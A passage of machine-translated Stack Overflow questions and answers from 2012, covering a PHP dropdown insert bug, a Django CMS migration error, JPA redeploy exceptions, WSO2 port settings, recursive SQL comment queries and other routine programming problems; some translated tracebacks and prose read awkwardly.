    $sql = "SELECT CourseId, CourseNo, CourseName FROM Course WHERE CourseActive = ? ORDER BY CourseNo"; 

    $sqlstmt=$mysqli->prepare($sql);

    $sqlstmt->bind_param("i",$courseactive);

    $sqlstmt->execute(); 

    $sqlstmt->bind_result($dbCourseId, $dbCourseNo, $dbCourseName);

    $courses = array(); // easier if you don't use generic names for data 

    $courseHTML = "";  
    $courseHTML .= '<select name="courses" id="coursesDrop">'.PHP_EOL; 
    $courseHTML .= '<option value="">Please Select</option>'.PHP_EOL;  

    $outputcourse = ""; 
    $hiddencourse = ""; 

    while($sqlstmt->fetch()) 
    { 
    $course = $dbCourseId;
    $courseno = $dbCourseNo;
    $coursename = $dbCourseName; 
    $courseHTML .= "<option value='".$course."'>" . $courseno . " - " . $coursename . "</option>".PHP_EOL;  

    if (isset($_POST['courses']) && ($_POST['courses'] == $course)) {
    $outputcourse .= "<p><strong>Course:</strong> " . $courseno .  " - "  . $coursename . "</p>";
    $hiddencourse .= "<p><input type='hidden' id='hiddencourse' value='". $courseno . " - " . $coursename ."'></p>";
}

    } 

    $courseHTML .= '</select>'; 
```

现在，如果您查看`<option>`while 循环中的标记，我已经说明每个选项的每个值都是课程的 ID。我这样做的原因是因为我想使用该值来查找`CourseId`所选课程的值，然后使用下面的代码将其插入到数据库中，该代码位于单独的页面（`insertmoduletocourse`）上：

```
$courseid = (isset($_POST['courses'])) ? $_POST['courses'] : '';    

$insertsql = "
INSERT INTO Course_Module
(CourseId)
VALUES
(?)
";
if (!$insert = $mysqli->prepare($insertsql)) {
// Handle errors with prepare operation here
}                                           

$insert->bind_param("i", $courseid);

$insert->execute();

if ($insert->errno) {
// Handle query error here
}

$insert->close(); 
```

但问题是，它没有在插入中插入 CourseId 编号，而是仅显示`0`，这意味着它无法从下拉选项的值中检索课程 ID。我的问题是，为什么它不能撤销它并因此继续插入 0？

我为`$course`in做了一个回`"<option value='".$course."'>"`显，它显示了正确的课程 ID，所以我不知道为什么它无法为插入检索它？

我正在使用下面的这个 ajax 函数导航到`insertmoduletocourse`：

```
function submitform() {    

    $.ajax({
        type: "POST",
        url: "insertmoduletocourse.php",
        data: $('#detailsForm').serialize(),
        success: function(html){
            $("#targetdiv").html(html);
            $('#targetdiv').show();

        }
     });        
} 
```

下面是包含课程下拉菜单和说明从下拉菜单中选择的课程的字符串的表单：

```
$moduleForm = "<div class='lt-container'>
<form action='".htmlentities($_SERVER['PHP_SELF'])."' method='post' id='moduleForm'>
<p id='warnings'>{$pHTML}</p>
{$outputcourse}
{$hiddencourse}
<p><strong>Add Module</strong></p>
<p><strong>Module:</strong> {$moduleHTML} </p>   
</form>
</div>"; 
```

以下是包含模块详细信息的表单：

```
$addmodule = "
<div class='lt-container'>
<form id='detailsForm'>

    <p><strong>Module Details</strong></p>
    <table>
    <tr>
    <th></th>
    <td><input type='hidden' id='idmodule' name='moduleid' value='' /> </td>
    </tr>
    <tr>
    <th>Module ID:</th>
    <td><input type='text' id='nomodule' name='moduleno' readonly='readonly' value='' /> </td>
    </tr>
    <tr>
    <th>Module Name:</th>
    <td><input type='text' id='namemodule' name='modulename' readonly='readonly' value='' /> </td>
    </tr>
    <tr>
    <th>Credits:</th>
    <td><input type='text' id='credits' name='creditsname' readonly='readonly' value=''/> </td>
    </tr>
    </table>
    <div id='moduleAlert'></div>

    </form>

    <p id='addbtn'><button id='addSubmit'>Add Module</button></p>

    </div>
"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:07:39.737

您正在序列化表单`$('#detailsForm').serialize(),`而不是包含下拉菜单的表单，即`moduleForm`.

```
 $.ajax({
    type: "POST",
    url: "insertmoduletocourse.php",
    data: data: { detailsForm: $('#detailsForm').serialize(), moduleForm : $('#moduleForm').serialize() },
    success: function(html){
        $("#targetdiv").html(html);
        $('#targetdiv').show();

    }
 }); 
```

# django - 无法升级 Django CMS 项目

> ID：13822445
> 
> 赞同：1
> 
> 时间：2012-12-11T14:59:43.923
> 
> 标签：django, django-south, django-cms, migrate

我正在尝试将 Django CMS 从 2.2.x 升级到 2.3.5，将 Django 从 1.3.x 升级到 1.4.3。

当我尝试使用 migrate from south 时，出现错误，我无法开始工作。

```

迁移错误：googlemap:0012_auto__add_field_googlemap_width__add_field_googlemap_height__chg_field
  回溯（最近一次通话最后）：
  文件“manage.py”，第 19 行，在
    execute_from_command_line(sys.argv)
  文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/django/core/management/__init__.py”，第 443 行，在 execute_from_command_line
    实用程序.execute()
  文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/django/core/management/__init__.py”，第382行，在执行
    self.fetch_command(子命令).run_from_argv(self.argv)
  文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/django/core/management/base.py”，第 196 行，在 run_from_argv
    self.execute(*args, **options.__dict__)
  文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/django/core/management/base.py”，第232行，在执行
    输出 = self.handle(*args, **options)
  文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/south/management/commands/migrate.py”，第 108 行，在句柄中
    忽略鬼=忽略鬼，
  文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/south/migration/__init__.py”，第 213 行，在 migrate_app
    成功 = migrator.migrate_many（目标、工作计划、数据库）
  文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/south/migration/migrators.py”，第 235 行，在 migrate_many
    结果 = 迁移器.__class__.migrate_many（迁移器，目标，迁移，数据库）
  文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/south/migration/migrators.py”，第 310 行，在 migrate_many
    结果 = self.migrate（迁移，数据库）
  迁移中的文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/south/migration/migrators.py”，第 133 行
    结果 = self.run（迁移）
  运行中的文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/south/migration/migrators.py”，第 107 行
    返回 self.run_migration(migration)
  文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/south/migration/migrators.py”，第 81 行，在 run_migration
    迁移函数（）
  文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/south/migration/migrators.py”，第 57 行，在
    返回（lambda：方向（orm））
  文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/cms/plugins/googlemap/migrations/0012_auto__add_field_googlemap_width__add_field_googlemap_height__chg_field.py”，第 19 行，向前
    保持默认=假）
  文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/south/db/sqlite3.py”，第 31 行，在 add_column
    field.column: self._column_sql_for_create(table_name, name, field, False),
  _cache_clear 中的文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/south/db/generic.py”，第 44 行
    返回函数（自我，表，*args，**opts）
  _remake_table 中的文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/south/db/sqlite3.py”，第 103 行
    ", ".join(["%s %s" % (self.quote_name(cname), ctype) for cname, ctype in definitions.items()]),
  文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/south/db/generic.py”，第 273 行，在执行
    cursor.execute（sql，参数）
  文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/django/db/backends/util.py”，第 44 行，在执行
    sql = self.db.ops.last_executed_query(self.cursor, sql, params)
  文件“/Users/fguimara/.virtualenvs/twist2/lib/python2.7/site-packages/django/db/backends/__init__.py”，第 595 行，在 last_executed_query
    返回 smart_unicode(sql) % u_params
TypeError：格式字符串的参数不足
```

由于未正确迁移，我的项目中出现以下错误

`no such column: cmsplugin_googlemap.height`

我能做些什么？

*编辑*：添加了由常规 pip install 安装的 googlemap/models.py

```
from django.db import models
from django.utils.translation import ugettext_lazy as _
from cms.models import CMSPlugin

class GoogleMap(CMSPlugin):
   """
   A google maps integration
   """
   title = models.CharField(_("map title"), max_length=100, blank=True,
                         null=True)

   address = models.CharField(_("address"), max_length=150)
   zipcode = models.CharField(_("zip code"), max_length=30)
   city = models.CharField(_("city"), max_length=100)

   content = models.CharField(_("additional content"), max_length=255,
                     blank=True,
                     help_text=_('Displayed under address in the bubble.'))
   ZOOM_LEVELS = map(lambda c: (c, str(c)), range(22))
   zoom = models.PositiveSmallIntegerField(_("zoom level"),
                                        choices=ZOOM_LEVELS, default=13)

   lat = models.DecimalField(_('latitude'), max_digits=10, decimal_places=6,
                          null=True, blank=True,
                          help_text=_('Use latitude & longitude to fine '
                                      'tune the map position.'))
   lng = models.DecimalField(_('longitude'), max_digits=10, decimal_places=6,
                          null=True, blank=True)

   route_planer_title = models.CharField(_("route planer title"),
                           max_length=150, blank=True, null=True,
                           default=_('Calculate your fastest way to here'))
   route_planer = models.BooleanField(_("route planer"), default=False)

   width = models.CharField(_('width'), max_length=6, default='100%',
                       help_text=_('Plugin width (in pixels or percent).'))
   height = models.CharField(_('height'), max_length=6, default='400px',
                          help_text=_('Plugin height (in pixels).'))

   def __unicode__(self):
       return u"%s (%s, %s %s)" % (self.get_title(), self.address,
                                self.zipcode, self.city,)

   def get_title(self):
       if self.title is None:
           return _("Map")
       return self.title

   def get_lat_lng(self):
       if self.lat and self.lng:
           return (self.lat, self.lng) 
```

# matlab - 分隔日期和时间，matlab

> ID：13822449
> 
> 赞同：1
> 
> 时间：2012-12-11T15:00:12.193
> 
> 标签：matlab

我有字符串向量

> 日期时间=[' 29.11.2012 19:37; '28.11.2012 19:38'; ....];

我怎样才能将它分成 yeras，months，days，hours，minutes。

我试过**datevec**但我得到了错误的结果。

问候，

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-11T15:08:19.757

一切似乎对我来说都很好。请注意，您必须以字符串元胞数组的形式提供日期，并且必须为 指定正确的格式`datevec`：

```
DateTime={' 29.11.2012 19:37'; ' 28.11.2012 19:38'};
datevec(DateTime,'dd.mm.yyyy HH:MM')
ans =
        2012          11          29          19          37           0
        2012          11          28          19          38           0 
```

# jpa - 重新部署后 JPA 实体中的 ClassCastException (Glassfish 3.1.2)

> ID：13822451
> 
> 赞同：6
> 
> 时间：2012-12-11T15:00:16.140
> 
> 标签：jpa, oracle11g, eclipselink, glassfish-3

使用 Glassfish 3.1.2 取消部署和部署 WebArchive (.war) 时，我有一个奇怪的效果。

```
$ asadmin undeploy myWebApp; asadmin deploy target/myWebApp.war 
```

它正常部署，但是当我通过实体管理器获取实体 bean 时，它会引发异常： `[#|2012-12-11T15:26:09.772+0100|SEVERE|glassfish3.1.2|javax.enterprise.system.std.com.sun.enterprise.server.logging|_ThreadID=119;_ThreadName=Thread-2;|java.lang.ClassCastException: org.YourEntity cannot be cast to org.YourEntity`

在 q.getSingleResult() 调用中抛出异常。

```
 @PersistenceContext(unitName = "org.my-PU")
  private EntityManager em = Persistence.createEntityManagerFactory("org.my-PU").createEntityManager();
  ...
  public YourEntity findYourEntity() throws Exception {
      TypedQuery<YourEntity> q = em.createQuery("select ye from YourEntity ye", 
              YourEntity.class);
      return q.getSingleResult();
  } 
```

我在项目中使用以下与 JPA 相关的依赖项：

```
<dependency>
  <groupId>org.eclipse.persistence</groupId>
  <artifactId>javax.persistence</artifactId>
  <version>2.0.0</version>
</dependency>

<dependency>
  <groupId>org.eclipse.persistence</groupId>
  <artifactId>eclipselink</artifactId>
  <version>2.0.2</version>
</dependency>

<dependency>
  <groupId>com.oracle</groupId>
  <artifactId>ojdbc6</artifactId>
  <version>11.1.0.7.0</version>
</dependency> 
```

当我重新启动 glassfish 时，不再发生异常。取消部署/部署具有类似设置的 .ear 时，我从未见过此问题。有没有人看到错误并知道如何克服它？这不是一个大问题，但很烦人。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-11T15:36:58.927

绑定到类加载器的资源被静态保存，直到 EntityManagerFactories 关闭。这些是应用程序管理的，因此您必须在工厂关闭时手动调用 close 或在不再需要它们时取消部署事件 - 垃圾收集也可能会清理它们，但在重新部署应用程序并使用 a 再次访问它们之前不会发生不同的类加载器，导致您看到的异常。

保留工厂并在不再需要时将其关闭，或者使用注入并让容器为您管理其生命周期。

# java - 安卓屏幕截图

> ID：13822452
> 
> 赞同：1
> 
> 时间：2012-12-11T15:00:18.760
> 
> 标签：java, android, video, surfaceview, android-videoview

我想将视频屏幕捕获为来自 android 中的 videoview 的图像。下面给出了我的代码。它创建了图像，但该图像在 sdcard 中仅包含黑屏。如何在播放时将 videoview 捕获为图像。

```
public class VidePlayerActivity extends Activity {
/** Called when the activity is first created. */
public String fname;
public int n=1;
LinearLayout screen;
Timer timer;
Bitmap bmScreen;
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main2);
    Button sr=(Button)findViewById(R.id.screenrec);
    screen=(LinearLayout)findViewById(R.id.screen);
    VideoView videoView=(VideoView)findViewById(R.id.videoView1);
    videoView.setVideoPath("sdcard/test.mp4");
    MediaController mediaController=new MediaController(this);
    videoView.setMediaController(mediaController);
    sr.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {
                    screen.setDrawingCacheEnabled(true);
                    bmScreen = screen.getDrawingCache();
                    saveImage(bmScreen);
        }
    });
    }
 protected void saveImage(Bitmap bmpscreen3) {

        //Toast.makeText(ScreenCaptureActivity.this, "saved", Toast.LENGTH_SHORT).show();
        File myDir=new File("/sdcard/Video_images");
          myDir.mkdirs();

           fname = "img"+ n +".jpg";
          File file = new File (myDir, fname);

        try {
            FileOutputStream ostream = new FileOutputStream(file);
            bmpscreen3.compress(CompressFormat.JPEG, 100, ostream);
            ostream.flush();
            ostream.close();
        } catch (Exception e) {
            e.printStackTrace();

        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:17:44.230

类似的东西已经发布到stackoverflow，下面的检查可能会帮助你。

[安卓屏幕截图](https://stackoverflow.com/questions/3733988/screen-capture-in-android)

这里还有一个：

[移动设备上的程序化截屏](https://stackoverflow.com/questions/3582603/programmatic-screencapture-on-mobile-device)

# mahout - Apache Mahout Distributed Recommender 推荐已评分的项目

> ID：13822455
> 
> 赞同：1
> 
> 时间：2012-12-11T15:00:32.207
> 
> 标签：mahout, recommendation-engine, mahout-recommender

我已经使用 10M movielens 数据集尝试了基于项目的分布式推荐作业。一切正常。我的问题是，在查看针对用户的推荐时，我发现在推荐项目列表中，有些项目已经被用户评分。更加具体：

假设用户 ID：4 的用户观看了以下 ID 的电影：[123,543,234,567,324]，然后在推荐列表中再次出现 543 和 234。我只是查看 Mahout in Action 以了解该算法，我找不到在生成 TopK 列表之前消除已评级项目的代码段。我错过了什么，还是它推荐已经评分的项目是正常的？

如果正常，是否可以从候选项目中消除这些项目？

PS：在产生推荐后过滤掉推荐对我的情况来说效率不高，因为我想要的推荐数量是 100，在过滤某些用户后，这个数字会减少到 30 等等。

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:10:52.000

自从我第一次编写代码以来，代码已经发生了很大变化，并且有几个`RecommenderJob`s，但最初有一个阶段为所有现有用户-项目对的最终向量和添加了一个“（用户，项目，NaN）”元组。这导致所有此类用户-项目对的总和为 NaN，并且可以从结果中排除。它可能已经不在里面了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T10:58:52.890

我是 RecommenderJob 的作者之一。我们有单元测试来明确检查用户是否不是他们已经知道的推荐项目。如果真的发生这种情况，那将是一个严重的错误。你能举一个你看到发生这种情况的输入数据的例子吗？

最好将此讨论移至 [https://cwiki.apache.org/confluence/display/MAHOUT/Mailing+Lists,+IRC+and+Archives的 mahout 邮件列表](https://cwiki.apache.org/confluence/display/MAHOUT/Mailing+Lists,+IRC+and+Archives)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-22T02:55:48.787

在Recommenderjob的源代码中：

addOption("filterFile", "f", "包含逗号分隔的用户ID，项目ID对的文件。用于从" + "该用户的推荐中排除项目（可选）", null);

我认为它可以通过将此文件提供给推荐工作来解决您的问题。

# database - HTML5 套接字的数据库是否保存数据？

> ID：13822457
> 
> 赞同：-1
> 
> 时间：2012-12-11T15:00:33.003
> 
> 标签：database

HTML5 套接字是将数据保存到数据库中还是类似于“通过而不保存数据”的段落？

是不是这样的：

```
 Client1Send -> Server -> Client2Read -> Server doesn't store data 
```

或这个？

```
 Client1Send -> Server -> Client2Read -> Server stores data 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:03:09.560

如果你在谈论 HTML5 **WebSockets**，不。

WebSocket 服务器不存储数据，除非您明确编写代码来存储数据。

# wso2 - WSO2 Api Manager - 在 EC2 中部署并更改默认端口

> ID：13822462
> 
> 赞同：1
> 
> 时间：2012-12-11T15:00:52.933
> 
> 标签：wso2, wso2-am

我正在EC2 VM 上部署最新的**WSO2 API Manager (1.2.0)。**我想更改默认端口，如下所示：

*   将碳端口从 更改`9443`为`8090`
*   将存储和发布者端口从 更改`9763`为`8080`
*   将 api 端口从 更改`8280`为`80`

我已经四处寻找了一段时间，但没有找到任何描述如何做到这一点的指南/教程。

非常感谢任何关于此的 URL/信息/帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T10:36:15.360

在 WSO2 API Manager (1.2.0) 中有两种传输方式。1.HttpCore + NIO扩展：由api网关（api）使用。2.Tomcat servlet传输：被碳管理控制台和Web应用程序（商店和发布者）使用

您可以更改这些传输的端口号。

根据您的要求，

要更改 api 的端口，请在 API_MANAGER_HOME/repository/conf/axis2/axis2.xml 中进行编辑

一个）

```
<transportReceiver name="http" class="org.apache.synapse.transport.nhttp.HttpCoreNIOListener">
<parameter name="port" locked="false">80</parameter> 
```

b)

```
<transportReceiver name="https" class="org.apache.synapse.transport.nhttp.HttpCoreNIOSSLListener">
        <parameter name="port" locked="false">443</parameter> 
```

要更改碳的端口，存储和发布者在 API_MANAGER_HOME/repository/conf/tomcat/catalina-server.xml 中编辑以下内容

一个）

```
<Connector  protocol="org.apache.coyote.http11.Http11NioProtocol"
                port="8080" 
```

b)

```
<Connector  protocol="org.apache.coyote.http11.Http11NioProtocol"
                port="8090" 
```

# html - 使占整个高度的部分和文章可用的地方

> ID：13822464
> 
> 赞同：0
> 
> 时间：2012-12-11T15:01:01.093
> 
> 标签：html, css

我遇到了一个奇怪的问题，我无法弄清楚为什么我的部分标签和文章不能占据整个可用高度。

基本上，我有一个不包含内容的部分和文章，但有一个隐藏的 div (.news)，只有当我们单击 UP 的链接时才应该可见。

据我了解，文章和部分标签没有获得高度值，我不明白为什么。

这是我正在使用的代码：

**编辑（添加代码）**

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Sticky footer &middot; Twitter Bootstrap</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- CSS -->
    <link href="http://twitter.github.com/bootstrap/assets/css/bootstrap.css" rel="stylesheet">
    <!-- <link href="http://twitter.github.com/bootstrap/assets/css/bootstrap-responsive.css" rel="stylesheet"> -->
    <style type="text/css">
    ​html,body{
    height:100%
}

#wrap {
    min-height:100%;
    height:auto !import;
    height:100%;
    margin: 0 auto -60px;
    background-color:lightgray;
}

header {
    height:70px;
}

section {
    height:100%;
    min-height:100%;
}

article {
    position:relative;
    background-color:lightgreen;
    overflow:hidden;
    height:100%;
    min-height:100%;
}

article .news {
    width:100%;
    position:absolute;
    bottom:0;
    background-color:red;
}

#push, .footer {
    height:60px;
}

.footer {
    padding-top:35px;
    background-color:#a3a3a3;
}
​
    </style>
  </head>
  <body>

    <div id="wrap">
    <header>Header</header>
    <section>
        <article>
            <div class="news row-fluid">
                <div class="span12"><a href="#" class="btn">^</a></div>
                <div class="container">
                    <div class="span6">My News 1</div>
                    <div class="span6">My News 2</div>
                </div>
            </div>
        </article>
    </section>
    <div id="push"></div>
</div>
<footer class="footer">
    Footer
</footer>
​

  </body>
</html> 
```

我没有使用 jsfiddle.net，因为我的问题没有出现在那里。

# objective-c - 视网膜显示，ImageView 显示错误大小的图像设置为 UIViewContentModeTopRight

> ID：13822467
> 
> 赞同：0
> 
> 时间：2012-12-11T15:01:01.897
> 
> 标签：objective-c, uiimageview, retina-display

我有一个比较不同饰面的应用程序。

我有 2 个并排的图像视图，设置为`UIViewContentModeTopLeft`和`UIViewContentModeTopRight`。左侧显示图像的左侧，右侧显示图像的右侧，因此您可以无缝比较图像。您可以将任何饰面拖动到任一侧以查看它们。

我的问题是视网膜显示器以双倍尺寸显示图像，因此您只能在每个图像视图中看到顶部象限。如果我使用调整大小功能将图像大小减半，它可以工作，但非视网膜显示器会在图像视图中显示小而完整的图像，而不仅仅是一半。

如果我运行调整大小函数并读回大小，我会得到这个，下面是我的调整大小函数：

> 2012-12-11 09:48:24.148 srg[20290:c07] 设置图像宽度：700.000000 高度：525.000000 2012-12-11 09:48:24.198 srg[20290:c07] 图像尺寸：{1400, 1050}

```
+ (UIImage *)resizeImage:(UIImage*)image newSize:(CGSize)newSize {
    CGRect newRect = CGRectIntegral(CGRectMake(0, 0, newSize.width, newSize.height));
    CGImageRef imageRef = image.CGImage;

    UIGraphicsBeginImageContextWithOptions(newSize, NO, 0);
    CGContextRef context = UIGraphicsGetCurrentContext();

    // Set the quality level to use when rescaling
    CGContextSetInterpolationQuality(context, kCGInterpolationHigh);
    CGAffineTransform flipVertical = CGAffineTransformMake(1, 0, 0, -1, 0, newSize.height);

    CGContextConcatCTM(context, flipVertical);
    // Draw into the context; this scales the image
    CGContextDrawImage(context, newRect, imageRef);

    // Get the resized image from the context and a UIImage
    CGImageRef newImageRef = CGBitmapContextCreateImage(context);
    UIImage *newImage = [UIImage imageWithCGImage:newImageRef];

    CGImageRelease(newImageRef);
    UIGraphicsEndImageContext();

    return newImage;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-24T07:21:36.653

尝试获取图像并创建两倍于正常大小的图像，并以`"image"@2x.png`这种方式将其设置在您的项目中，xcode 将自动为视网膜显示设备使用@2x 图像，`image.png`为非视网膜设备使用常规图像。或者，如果视网膜设备使您的图像变大，则将图像缩小一半并将其设置为@2x，这应该可以解决问题。希望有帮助。

# c - avr-gcc：没有为任何调用堆栈帧定位符号

> ID：13822469
> 
> 赞同：1
> 
> 时间：2012-12-11T15:01:07.810
> 
> 标签：c, debugging, optimization, linker, avr-gcc

我使用 Atmel Studio 6 开发了一个 GCC C 可执行项目。目标设备是 ATtiny2313A。有一个C文件和其他头文件。

当我设置大小优化时，我无法调试解决方案，因为当我进入头文件中包含的函数时，调试器会显示错误`No source available. No symbols are located for any call stack frame. The source code cannot be displayed`。

调试器适用于所有其他优化类型（`-O1`, `-O2`, `-O3`）。

此外，该软件可以在真实芯片上运行。

我需要知道我的代码的时间，但我还需要节省闪存空间，因此我无法避免使用优化大小来调试代码。

似乎问题在于链接器无法链接代码的不同部分，因为缺少一些符号。我怎样才能让它使用所有必要的符号？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T15:32:28.813

确保您使用的是 gdwarf2 目标文件格式。我有一个类似的问题，编译的代码没有正确链接回源代码。

# android - 检查 Android 设备上是否存在应用程序

> ID：13822474
> 
> 赞同：0
> 
> 时间：2012-12-11T15:01:26.677
> 
> 标签：android, android-package-managers, android-applicationinfo

实际上，我正在检查我的应用程序是否存在一个特定应用程序是否存在于设备中，如果它存在，那么只有我的应用程序将启动，否则它将给出一个对话框以下载该特定应用程序以继续。

截至目前，我正在使用应用程序包名称或应用程序名称检查它，但 android 中的问题是另一个应用程序也可以具有相同的名称和包名称。因此，如果用户将卸载原始应用程序并制作一个具有相同包名的应用程序，我就会被黑。

那么有什么方法可以阻止我被黑意味着我们可以使用一些独特的东西来检查应用程序的存在，比如密钥库或者即使用户安装了另一个具有相同包信息的应用程序也不能相同的东西。

谢谢。

# php - 使用 PHP 在 SQL 中进行无限自连接？

> ID：13822475
> 
> 赞同：0
> 
> 时间：2012-12-11T15:01:46.223
> 
> 标签：php, sql, select

有一个这样的 SQL 表：

```
+----+-----------+----------+
| ID | Comment   | ParentID |
+----+-----------+----------+
|  1 | Some Text |        0 |
|  2 | Some Text |        0 |
|  3 | Some Text |        2 |
|  4 | Some Text |        2 |
|  5 | Some Text |        3 |
|  6 | Some Text |        3 |
|  7 | Some Text |        1 |
+----+-----------+----------+ 
```

这是一篇博客文章的评论和一些子评论。子级的深度是无限的：每个子评论都可以有另一个子评论。

用户现在想删除 ID 为 2 的父评论。所以我需要一个 SQL 查询，它选择所有子评论 ID（和子评论等）。

目前我有这个查询，它只选择子评论的第一级：

```
SELECT ID
FROM comment_table
WHERE ParentID = 2 
```

是否可以在一个查询中选择*所有*这些子评论？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-04-26T23:27:02.117

我更喜欢使用的一个解决此问题的方法是添加“物化路径”。

您只需要添加一个包含对象的整个祖先的列。例如，您的表格调整如下：

```
+----+-----------+----------+----------+
| ID | Comment   | ParentID | TreePath |
+----+-----------+----------+----------+
|  1 | Some Text |        0 |          |
|  2 | Some Text |        0 |          |
|  3 | Some Text |        2 |       -2-|
|  4 | Some Text |        2 |       -2-|
|  5 | Some Text |        3 |     -2-3-|
|  6 | Some Text |        3 |     -2-3-|
|  7 | Some Text |        1 |       -1-|
+----+-----------+----------+----------+ 
```

选择 2 的所有后代如下所示：

```
SELECT ID FROM comment_table WHERE TreePath LIKE '-2-%' 
```

如果你想在 PHP 中构建一个注释树，你甚至可以通过排序`TreePath`得到一个相当容易转换为树的数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:48:15.737

你可以用一个简单的递归函数在 PHP 中做到这一点：

```
function child_comments($id,&$arr) {
   $sql = 'SELECT ID, Comment, ParentID FROM comment_table WHERE ParentID='.$id;
   // get rows for $sql
   foreach ($rows as $row) {
      $arr[] = $row;
      child_comments($row['id'],$arr);
   }
}
child_comments(2,$comments); 
```

`$comments`将保存一系列评论 2 的孩子，它是孩子的​​孩子等等......

上述代码被视为伪代码，需要进行调整以适应您从数据库（pdo、mysqli、mysql_*）中检索数据的方式。

特别`// get rows for $sql`需要用相关代码替换以获取`$sql`.

递归调用`child_comments`可能还需要根据从数据库返回的行的结构进行调整，这`$row['id']`可能不是访问`ID`字段的正确方式。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T15:17:56.137

这是一个常见问题，鉴于您的数据库结构并没有真正好的答案，因为大多数 SQL 数据库不支持递归查询，因此您要么需要执行很多很多查询（这很糟糕），要么限制嵌套（也不好）。

有一些解决方案，但它们涉及备用数据库模式。Bill Karwin 写了一些关于 PHP/MySQL 中分层数据问题的文章。他在这里有一个演讲：[http](http://www.percona.tv/percona-webinars/models-for-hierarchical-data-in-sql-and-php) ://www.percona.tv/percona-webinars/models-for-hierarchical-data-in-sql-and-php他讨论了一些选项。他还在他的书（SQL 反模式）中写了博客并撰写了有关不同选项及其优缺点的章节。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-11T15:17:56.507

我不知道单个查询，但是在该表中添加一个 isChildren 列怎么样？

这样，您将收到要删除的评论的 id，将其存储在 $idToDelete 中，并删除 id 等于您收到的 id 的评论，删除它，将其 parentId 保存在 $idToDelete 中，等等。您可以在一个检查列 isChildren 是否为真的 while 块。如果 isChildren 为 false，则您删除了该评论的第一个父级及其所有子级。

那应该工作不应该吗？不知道是否可以选择修改数据库。

# jquery - 切换到新页面时如何保留 jQuery 切换状态

> ID：13822476
> 
> 赞同：0
> 
> 时间：2012-12-11T14:35:15.657
> 
> 标签：jquery

我想要完成的似乎很简单，但我一直无法弄清楚如何实现这个功能。

我有一个 jQuery 切换效果应用于名为“Quick Brew Selector”的导航元素。它本质上是针对不同啤酒制造商的快速视觉导航。请在此处查看此操作：http: [//srperrott.silverjerk.com/products/domestic/millercoors](http://srperrott.silverjerk.com/products/domestic/millercoors)

当您第一次进入啤酒页面时，我希望它保持关闭状态，但我觉得过渡到下一页有点不和谐，因为我将一些 jQuery 效果应用于页面上的某些元素以使体验更加生动。再加上 Quick Brew Selector 的崩溃，我觉得体验太生涩，或者不够流畅（很难传达我发现的问题，但我觉得如果选择器在下一页这将解决问题）。

我正在使用一个简单的 jQuery 切换来从 brew 选择器中获得我想要的功能。在打开此选择器的情况下，我需要对下一页的代码进行哪些更改才能加载？到目前为止，这是我的代码（我的 jQuery 非常差，所以请放轻松！）

```
$(document).ready(function(){
  $(".quick-brew-header").toggle(function(){
    $(".zone-preface-wrapper").animate({height:165},40);
    },function(){
    $(".zone-preface-wrapper").animate({height:40},40);
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:29:47.393

如果您想要一个向后兼容的解决方案，您可以在可用时将状态存储在 localStorage 中，否则存储在 cookie 中。如果您不想使用 cookie，您可以将标题状态附加到菜单中每个链接的哈希片段中，然后从`document.location.href`加载下一页时读取状态。我为下面的 localStorage/cookie 版本编写了一些代码。不过，在某些方面，我认为哈希片段解决方案可能会更好（即使它使您的链接 URL 更丑陋），因为如果有人使用您的啤酒选择器，然后在一小时后返回该页面，也许您不希望当时自动扩展标题。

```
$(document).ready(function(){

  function store_toggle_state(state) {
    if (typeof(Storage) !== "undefined") {
      localStorage["quick-brew-header"] = state;
    } else {
      // No localStorage, so use a cookie
      // Alternatively, you could store in URL
      // $.map($(".quick-brew-container a"), function (link) {
      //    $(link).attr("href", $(link).attr("href").split("#")[0] + "#" + state;
      // });
      document.cookie = "quick-brew-header=" + state;
    }
  }

  function get_toggle_state() {
    var state = false;

    if (typeof(Storage) !== "undefined") {
      if ("quick-brew-header" in localStorage) {
        state = localStorage["quick-brew-header"];
      }
    } else {
